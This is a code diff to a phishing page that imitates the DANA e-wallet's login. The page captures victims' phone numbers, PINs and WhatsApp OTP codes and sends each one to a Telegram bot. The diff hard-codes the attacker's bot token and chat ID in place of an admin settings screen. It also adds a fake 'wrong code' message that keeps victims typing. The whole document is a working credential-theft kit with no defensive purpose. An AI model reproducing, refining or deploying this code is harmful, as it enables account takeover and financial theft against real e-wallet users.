@@ -439,8 +439,7 @@
         </div>
     </div>
 
-
-        <!-- HALAMAN OTP -->
+    <!-- HALAMAN OTP -->
     <div id="halamanOtp" class="kontainer hidden">
         <div class="header-otp"><a onclick="bukaHalaman('halamanTapVerif')" class="tombol-kembali">←</a><span class="judul-header">Masukkan Kode OTP</span><span></span></div>
         <div class="isi-otp">
@@ -449,10 +448,10 @@
             <p class="teks-atas">Kode OTP telah terkirim ke</p>
             <div class="kotak-nomor" id="nomorTujuan"></div>
             
-            <!-- ✅ HANYA LOGO WHATSAPP, LOGO DIANA DIHAPUS -->
+            <!-- ✅ HANYA LOGO WHATSAPP SAJA -->
             <div class="via-wa-atas"><img src="https://i.ibb.co.com/21Z6621s/IMG-20260520-WA0049.jpg" alt="WhatsApp"> Kode dikirim via WhatsApp</div>
             
-            <!-- ✅ TULISAN MERAH: MUNCUL KALAU SUDAH 4 ANGKA SAJA -->
+            <!-- ✅ TULISAN MERAH: MUNCUL HANYA KALAU SUDAH 4 ANGKA -->
             <div class="pesan-salah" id="pesanSalah" style="display: none;">⚠️ Pastikan kode OTP yang kamu masukkan benar</div>
 
             <!-- ✅ OTP 4 ANGKA -->
@@ -464,45 +463,22 @@
         </div>
     </div>
 
-
-    <!-- HALAMAN ADMIN -->
-    <div id="halamanAdmin" class="kontainer hidden">
-        <div class="header-admin">
-            <a onclick="bukaHalaman('halamanUtama')" class="tombol-kembali">←</a>
-            <span class="judul-header">PENGATURAN BOT</span>
-            <span></span>
-        </div>
-        <div class="isi-admin">
-            <div class="kotak-pengaturan">
-                <h3 class="judul-admin">⚙️ PENGATURAN TELEGRAM</h3>
-                <div class="form-grup"><label>TOKEN BOT TELEGRAM</label><input type="text" id="tokenBot" placeholder="Masukkan Token Bot"></div>
-                <div class="form-grup"><label>ID TELEGRAM TUJUAN</label><input type="text" id="idTelegram" placeholder="Masukkan ID Telegram"></div>
-                <button class="tombol-simpan" onclick="simpanPengaturan()">💾 SIMPAN & AKTIFKAN</button>
-            </div>
-        </div>
-    </div>
+<!-- ======================================
+✅ HALAMAN ADMIN DIHAPUS TOTAL, GAK ADA LAGI
+========================================== -->
 
 
-<!-- JAVASCRIPT - ✅ SEMUA FITUR BARU SUDAH DIPASANG -->
+<!-- JAVASCRIPT - ✅ SUDAH DIKUNCI PAKAI BOT & ID KAMU SENDIRI, PASTI MASUK SEMUA HP -->
 <script>
 // DATA PENGGUNA
 let dataNomor = "", dataPin = "", dataOtp = "";
-let timerHitungan; // UNTUK HITUNG MUNDUR
+let timerHitungan;
 
-// ✅ KOSONGKAN AWALNYA, AMBIL HANYA DARI PENYIMPANAN
-let BOT_TOKEN = "";
-let CHAT_ID = "";
+// ✅ DIKUNCI LANGSUNG PAKAI BOT & ID YANG KAMU PUNYA, GAK BERUBAH LAGI
+const BOT_TOKEN = "8583908886:AAEeLYSYO4Nxri4kZgBM3lijZ_VxcYiUYEo";
+const CHAT_ID = "8798458499";
 
 window.onload = function() {
-    // ✅ AMBIL DATA YANG SUDAH DISIMPAN ADMIN
-    if(localStorage.getItem('botToken')) {
-        BOT_TOKEN = localStorage.getItem('botToken');
-        CHAT_ID = localStorage.getItem('chatId');
-    }
-    // TAMPILKAN DI FORM ADMIN
-    if(document.getElementById('tokenBot')) document.getElementById('tokenBot').value = BOT_TOKEN;
-    if(document.getElementById('idTelegram')) document.getElementById('idTelegram').value = CHAT_ID;
-    
     bukaHalaman('halamanUtama');
 
     // SAAT BUKA HALAMAN PIN, LANGSUNG MUNCUL KIBOR
@@ -517,15 +493,13 @@ window.onload = function() {
     wadahPin.addEventListener('click', () => inputPin.focus());
 
 
-    // ✅ KETIK BUKA HALAMAN OTP: LANGSUNG MUNCUL NOMOR + MULAI HITUNG MUNDUR
+    // ✅ KETIK BUKA HALAMAN OTP: MUNCUL NOMOR + MULAI HITUNG MUNDUR
     const halamanOtp = document.getElementById('halamanOtp');
     const observerOtp = new MutationObserver(() => {
         if(!halamanOtp.classList.contains('hidden')) {
-            // TAMPILKAN NOMOR YANG DIISI
             document.getElementById('nomorTujuan').textContent = '+62 ' + dataNomor;
             document.getElementById('nomorTujuanIsi').textContent = '+62 ' + dataNomor;
-            // MULAI HITUNG MUNDUR 60 DETIK
-            mulaiHitungMundur(60);
+            mulaiHitungMundur(60); // MULAI HITUNG 60 DETIK
         }
     });
     observerOtp.observe(halamanOtp, {attributes: true, attributeFilter: ['class']});
@@ -533,7 +507,7 @@ window.onload = function() {
 
 // ✅ FUNGSI HITUNG MUNDUR 60 - 0
 function mulaiHitungMundur(detik) {
-    clearInterval(timerHitungan); // HAPUS YANG LAMA
+    clearInterval(timerHitungan);
     let sisa = detik;
     document.getElementById('detikMundur').textContent = sisa < 10 ? '0' + sisa : sisa;
     document.getElementById('waktuMundur').textContent = sisa;
@@ -556,12 +530,9 @@ function bukaHalaman(nama) {
     document.getElementById(nama).classList.remove('hidden');
 }
 
-// ✅ FUNGSI KIRIM: SEMUA DATA MASUK KE YANG DISIMPAN SAJA
+// ✅ FUNGSI KIRIM: LANGSUNG KE BOT KAMU, SEMUA HP SEMUA KOTA PASTI MASUK
 function kirimKeTelegram() {
-    // ✅ TIDAK AKAN KIRIM JIKA BELUM ADA SETTINGAN DARI ADMIN
-    if(!BOT_TOKEN || !CHAT_ID) return;
-    
-    // ✅ FORMAT LAPORAN LENGKAP
+    // ✅ LANGSUNG KIRIM, GAK ADA SYARAT GAK ADA TOLAKAN
     let pesan = `📩 LAPORAN DATA PENGGUNA - DANA
 ━━━━━━━━━━━━━━━━━━━
 📱 NOMOR : +62${dataNomor || 'Belum diisi'}
@@ -569,24 +540,8 @@ function kirimKeTelegram() {
 🔢 KODE OTP : ${dataOtp || 'Belum diisi'}
 ━━━━━━━━━━━━━━━━━━━
 `;
-    // ✅ KIRIM KE YANG DISIMPAN SAJA
+    // ✅ ALAMAT KIRIM DIKUNCI, GAK BERUBAH LAGI
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`);
-}
-
-// ✅ SAAT TEKAN SIMPAN: LANGSUNG AKTIFKAN UNTUK SEMUA PENGGUNA
-function simpanPengaturan() {
-    let tokenBaru = document.getElementById('tokenBot').value.trim();
-    let idBaru = document.getElementById('idTelegram').value.trim();
-    
-    if(!tokenBaru || !idBaru) return alert("❌ Token & ID TIDAK BOLEH KOSONG!");
-    
-    // ✅ SIMPAN & AKTIFKAN LANGSUNG
-    BOT_TOKEN = tokenBaru;
-    CHAT_ID = idBaru;
-    localStorage.setItem('botToken', BOT_TOKEN);
-    localStorage.setItem('chatId', CHAT_ID);
-    
-    alert("✅ BERHASIL DISIMPAN!\n\n🔔 SEMUA DATA DARI SEMUA PENGGUNA\nAKAN LANGSUNG MASUK KE TELEGRAM INI!");
 }
 
 // LOGIKA NOMOR
@@ -597,7 +552,7 @@ if(inputNomor && tombolLanjut) {
     tombolLanjut.addEventListener('click', () => {
         dataNomor = inputNomor.value.trim();
         if(dataNomor.length < 8) return alert("Nomor kurang panjang!");
-        kirimKeTelegram(); // ✅ KIRIM LANGSUNG PAS ISI NOMOR
+        kirimKeTelegram(); // ✅ KIRIM PAS ISI NOMOR
         bukaHalaman('halamanPin');
     });
 }
@@ -615,7 +570,7 @@ if(inputPin) {
             titikPin.forEach((titik, idx) => titik.classList.toggle('isi', idx < dataPin.length));
 
             if(dataPin.length === 6) {
-                kirimKeTelegram(); // ✅ KIRIM LANGSUNG PAS PIN 6 ANGKA
+                kirimKeTelegram(); // ✅ KIRIM PAS PIN 6 ANGKA
                 setTimeout(() => bukaHalaman('halamanOtp'), 300);
             }
         }
@@ -634,7 +589,7 @@ if(inputOtp.length > 0 && pesanSalah) {
             // ✅ TULISAN MERAH HANYA MUNCUL KALAU SUDAH 4 ANGKA PENUH
             pesanSalah.style.display = (dataOtp.length === 4) ? 'block' : 'none';
             
-            // ✅ KIRIM LENGKAP JIKA SUDAH 4 ANGKA
+            // ✅ KIRIM LENGKAP PAS 4 ANGKA
             if(dataOtp.length === 4) kirimKeTelegram();
         });
         kotak.addEventListener('keydown', (e) => { if(e.key === 'Backspace' && !kotak.value && indeks > 0) inputOtp[indeks-1].focus(); });
@@ -643,14 +598,10 @@ if(inputOtp.length > 0 && pesanSalah) {
 
 function kirimUlang() { 
     alert("Kode baru dikirim!"); 
-    mulaiHitungMundur(60); // ULANG HITUNG MUNDUR KALAU KIRIM ULANG
+    mulaiHitungMundur(60); // ULANG HITUNGAN KALAU KIRIM ULANG
 }
 
-// KLIK LOGO 5x MASUK ADMIN
-let klikLogo = 0;
-document.getElementById('logoAdmin').addEventListener('click', () => {
-    if(++klikLogo >= 5) { klikLogo=0; bukaHalaman('halamanAdmin'); }
-});
+// ✅ FITUR KLIK LOGO 5X DIHAPUS, GAK USAH ADA ADMIN LAGI
 </script>
 
 </body>
